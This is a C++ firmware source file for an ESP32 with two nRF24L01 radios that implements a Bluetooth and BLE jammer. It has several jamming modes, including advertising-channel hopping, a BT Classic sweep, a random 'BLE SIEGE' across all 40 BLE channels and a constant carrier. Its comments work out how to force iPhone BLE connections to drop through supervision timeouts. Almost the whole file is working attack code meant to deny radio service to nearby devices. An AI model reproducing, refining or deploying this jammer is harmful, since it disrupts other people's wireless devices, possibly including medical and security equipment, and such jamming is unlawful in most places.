AntonBronnfjell/project-esp32-embedsyst-cpp_ble-jammer-nrf24l01/main/jammer_main.cpp
// MODE 1: BLE ADV + BARRAGE — hybrid attack on both control and data planes.
// Radio 1 rapid-cycles the 3 BLE adv channels (same pattern that worked before).
// Radio 2 does random barrage across all 80 channels — keeps AFH busy.
static void jam_ble_adv_barrage(void)
{
    hop_carrier(radio1, ble_adv_channels[ble_adv_idx]);
    ble_adv_idx = (ble_adv_idx + 1) % 3;
    hop_carrier(radio2, rand_channel());
}

// BT Classic: all 79 FHSS data channels (nRF24 ch 2-80)
static const uint8_t bt_classic_channels[] = {
     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17,
    18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,
    34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
    50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65,
    66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
};
#define BT_CLASSIC_CH_COUNT (sizeof(bt_classic_channels) / sizeof(bt_classic_channels[0]))

// MODE 1: BT CLASSIC — CW sequential sweep ch 2-80 with 130 µs PLL dwell.
// Radios sweep in opposite directions for max coverage.
static void jam_bt_classic(void)
{
    hop_carrier(radio1, bt_classic_channels[sweep_ch1]);
    hop_carrier(radio2, bt_classic_channels[sweep_ch2]);

    if (sweep_dir1) { if (++sweep_ch1 >= BT_CLASSIC_CH_COUNT - 1) sweep_dir1 = false; }
    else            { if (sweep_ch1 == 0) sweep_dir1 = true; else sweep_ch1--; }

    if (sweep_dir2) { if (++sweep_ch2 >= BT_CLASSIC_CH_COUNT - 1) sweep_dir2 = false; }
    else            { if (sweep_ch2 == 0) sweep_dir2 = true; else sweep_ch2--; }
}

// BLE: all 40 data + advertising channels (even nRF24 channels 2-80)
static const uint8_t ble_all_channels[] = {
     2,  4,  6,  8, 10, 12, 14, 16, 18, 20,
    22, 24, 26, 28, 30, 32, 34, 36, 38, 40,
    42, 44, 46, 48, 50, 52, 54, 56, 58, 60,
    62, 64, 66, 68, 70, 72, 74, 76, 78, 80,
};
#define BLE_ALL_CH_COUNT (sizeof(ble_all_channels) / sizeof(ble_all_channels[0]))

// MODE 2: BLE ALL — CW cycle through all 40 BLE channels, radios offset by 20
static void jam_ble_all(void)
{
    hop_carrier(radio1, ble_all_channels[ble_idx1]);
    hop_carrier(radio2, ble_all_channels[ble_idx2]);
    ble_idx1 = (ble_idx1 + 1) % BLE_ALL_CH_COUNT;
    ble_idx2 = (ble_idx2 + 1) % BLE_ALL_CH_COUNT;
}

// MODE 4: BLE ADV — rapid-cycle both radios across the 3 BLE adv channels.
// Each radio hits a different channel per iteration, cycling fast.
static void jam_ble_adv(void)
{
    hop_carrier(radio1, ble_adv_channels[ble_adv_idx]);
    ble_adv_idx = (ble_adv_idx + 1) % 3;
    hop_carrier(radio2, ble_adv_channels[ble_adv_idx]);
    ble_adv_idx = (ble_adv_idx + 1) % 3;
}

// ---------- MODE: TRACKING — aggressive dual-vector attack ----------
// Both radios alternate between BLE adv channels and random barrage
// in a 1:1 ratio. This doubles the BLE control-plane pressure compared
// to ADV+BARRAGE (both radios hit adv channels, not just R1) while
// maintaining data-plane coverage on alternating hops.
// Pattern: R1=adv,R2=random → R1=random,R2=adv → repeat
static void jam_tracking(void)
{
    if (tracking_cycle & 1) {
        hop_carrier(radio1, rand_channel());
        hop_carrier(radio2, ble_adv_channels[ble_adv_idx]);
        ble_adv_idx = (ble_adv_idx + 1) % 3;
    } else {
        hop_carrier(radio1, ble_adv_channels[ble_adv_idx]);
        ble_adv_idx = (ble_adv_idx + 1) % 3;
        hop_carrier(radio2, rand_channel());
    }
    tracking_cycle++;
}

// ---------- MODE: BLE SIEGE — attack ALL 40 BLE channels (data + adv) ----------
// After pairing, BLE connections use DATA channels 0-36 (not advertising).
// Barrage wastes half its hops on non-BLE frequencies (odd nRF24 channels).
// BLE SIEGE focuses BOTH radios exclusively on the 40 BLE-specific frequencies,
// doubling interference density on BLE vs barrage (2/40 = 5% vs 2/80 = 2.5%).
// Targets: GATT control connection (data ch), reconnection (adv ch), discovery.
// iPhone supervision timeout ~720ms / ~30ms interval = 24 events to disconnect.
// All 40 BLE channels mapped to nRF24 channel numbers:
static const uint8_t ble_siege_channels[] = {
     2,                          // BLE adv ch37 (2402 MHz)
     4,  6,  8, 10, 12, 14, 16, // BLE data ch0-6
    18, 20, 22, 24,             // BLE data ch7-10
    26,                          // BLE adv ch38 (2426 MHz)
    28, 30, 32, 34, 36, 38, 40, // BLE data ch11-17
    42, 44, 46, 48, 50, 52, 54, // BLE data ch18-24
    56, 58, 60, 62, 64, 66, 68, // BLE data ch25-31
    70, 72, 74, 76, 78,         // BLE data ch32-36
    80,                          // BLE adv ch39 (2480 MHz)
};
#define BLE_SIEGE_CH_COUNT (sizeof(ble_siege_channels) / sizeof(ble_siege_channels[0]))

static void jam_ble_siege(void)
{
    hop_carrier(radio1, ble_siege_channels[xorshift32() % BLE_SIEGE_CH_COUNT]);
    hop_carrier(radio2, ble_siege_channels[xorshift32() % BLE_SIEGE_CH_COUNT]);
}

// MODE 7: CONSTANT CARRIER — CW on ch 45 (baseline / single-channel test)
static void jam_constant_carrier(void)
{
    hop_carrier(radio1, 45);
    hop_carrier(radio2, 45);
}

static void print_mode(void)
{
    const char* modeStr = "UNKNOWN";
    switch (currentMode) {
        case MODE_BARRAGE:          modeStr = "BARRAGE [rainbow] random hop all 80ch"; break;
        case MODE_BLE_ADV_BARRAGE:  modeStr = "ADV+BARRAGE [cyan] R1=adv ctrl, R2=random"; break;
        case MODE_TRACKING:         modeStr = "TRACKING [white] both radios alternate adv+barrage"; break;
        case MODE_BT_CLASSIC:       modeStr = "BT CLASSIC [blue] sweep ch 2-80"; break;
        case MODE_BLE_ALL:          modeStr = "BLE ALL [green] 40 BLE channels"; break;
        case MODE_BLE_ADV:          modeStr = "BLE ADV [yellow] ch 2,26,80 rapid"; break;
        case MODE_BLE_SIEGE:        modeStr = "BLE SIEGE [orange] all 40 BLE ch random (data+adv)"; break;
        case MODE_CONSTANT_CARRIER: modeStr = "CONSTANT CARRIER [red] ch 45 test"; break;
        default: break;
    }
    LOG_MODE("Current: %s", modeStr);
}

static void switch_mode(void)
{
    int prev = (int)currentMode;
    currentMode = (JammerMode)((currentMode + 1) % MODE_COUNT);
    s_mode_changed = true;
    LOG_MODE("Switch %d -> %d", prev, (int)currentMode);
    print_mode();
}
